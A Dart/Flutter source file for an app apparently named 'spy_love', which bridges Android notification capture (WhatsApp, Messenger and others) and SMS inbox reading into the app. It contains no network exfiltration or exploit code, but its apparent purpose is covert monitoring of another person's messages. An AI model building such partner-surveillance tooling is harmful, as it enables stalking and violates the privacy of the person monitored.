import 'package:flutter/services.dart';

/// Android notification listener bridge for WhatsApp, Messenger, etc.
class NotificationBridge {
  NotificationBridge._();

  static const _channel = MethodChannel('org.hmg.spy_love/monitoring');
  static const _eventChannel = EventChannel(
    'org.hmg.spy_love/notification_events',
  );

  static Stream<Map<String, dynamic>>? _stream;

  static Stream<Map<String, dynamic>> get notificationStream {
    _stream ??= _eventChannel.receiveBroadcastStream().map(
      (event) => Map<String, dynamic>.from(event as Map),
    );
    return _stream!;
  }

  static Future<bool> isNotificationAccessEnabled() async {
    try {
      final enabled = await _channel.invokeMethod<bool>(
        'isNotificationAccessEnabled',
      );
      return enabled ?? false;
    } on PlatformException {
      return false;
    }
  }

  static Future<void> openNotificationAccessSettings() async {
    try {
      await _channel.invokeMethod<void>('openNotificationAccessSettings');
    } on PlatformException {
      // ignored
    }
  }

  static Future<List<Map<String, dynamic>>> getSmsInbox({
    required int sinceMs,
    int limit = 100,
  }) async {
    try {
      final result = await _channel.invokeMethod<List<dynamic>>('getSmsInbox', {
        'sinceMs': sinceMs,
        'limit': limit,
      });
      if (result == null) return [];
      return result
          .map((item) => Map<String, dynamic>.from(item as Map))
          .toList();
    } on PlatformException {
      return [];
    }
  }
}
